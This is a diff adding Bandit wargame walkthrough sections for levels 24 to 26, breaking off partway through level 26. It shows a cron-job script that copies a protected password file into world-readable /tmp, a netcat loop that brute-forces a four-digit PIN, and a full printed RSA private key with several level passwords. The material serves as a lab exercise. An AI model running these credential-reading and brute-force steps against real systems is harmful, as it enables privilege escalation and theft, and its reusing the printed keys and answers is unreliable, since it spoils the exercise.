@@ -1009,3 +1009,186 @@ bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 ```
+
+## Level 24
+
+### Task
+
+A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.
+
+**Note 1**: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+**Note 2**: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around...
+
+### Solution
+
+```
+bandit23@bandit:~$ ls /etc/cron.d/
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+```
+
+The idea: add a script to `/var/spool/bandit24/foo` to get the password.
+
+The script `/var/spool/bandit24/foo/script.sh`:
+
+```
+#!/bin/bash
+
+mkdir /tmp/thedesiredpassword
+cp /etc/bandit_pass/bandit24 /tmp/thedesiredpassword/thedesiredpassword
+chmod 777 /tmp/thedesiredpassword/thedesiredpassword
+```
+
+Don't forget to make it executable:
+
+```
+chmod +x script.sh
+```
+
+Then, check when the script disappears...
+
+```
+bandit23@bandit:/var/spool/bandit24/foo$ ls script.sh
+script.sh
+bandit23@bandit:/var/spool/bandit24/foo$ ls script.sh
+ls: cannot access 'script.sh': No such file or directory
+bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/thedesiredpassword/thedesiredpassword
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
+
+## Level 25
+
+### Task
+
+A daemon is listening on port `30002` and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time.
+
+### Solution
+
+Example Bash `for` loop producing all numbers between 1 and 1000:
+
+```
+for i in {1..10}; do echo $i; done
+```
+
+Now we try:
+
+```
+for i in {0000..1000}; do echo $i; done
+```
+
+This works! Thus:
+
+```
+for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}; done | nc localhost 30002 | grep -v Wrong
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+Exiting.
+```
+
+This gives:
+
+```
+p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
+
+## Level 26
+
+### Task
+
+Logging in to `bandit26` from `bandit25` should be fairly easy... The shell for user `bandit26` is not `/bin/bash`, but something else. Find out what it is, how it works and how to break out of it.
+
+### Solution
+
+```
+bandit25@bandit:~$ ls
+bandit26.sshkey
+bandit25@bandit:~$ cat bandit26.sshkey
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+```
+
+Still, this does not enable us to login directly... Get back to `bandit25`.
+
+```
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+```
+
+Try:
+
+```
+bandit25@bandit:~$ /usr/bin/showtext
+more: cannot open /home/bandit25/text.txt: No such file or directory
+```
+
+```
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+```
+
+Moreover:
+
+```
+bandit25@bandit:~$ ls -l /usr/bin/showtext
+-rwxr-xr-x 1 root root 58 Oct  5  2023 /usr/bin/showtext
+bandit25@bandit:~$ ls -l /home/bandit26/text.txt
+-rw-r----- 1 bandit26 bandit26 258 Oct  5  2023 /home/bandit26/text.txt
+```
+
+Continuing...
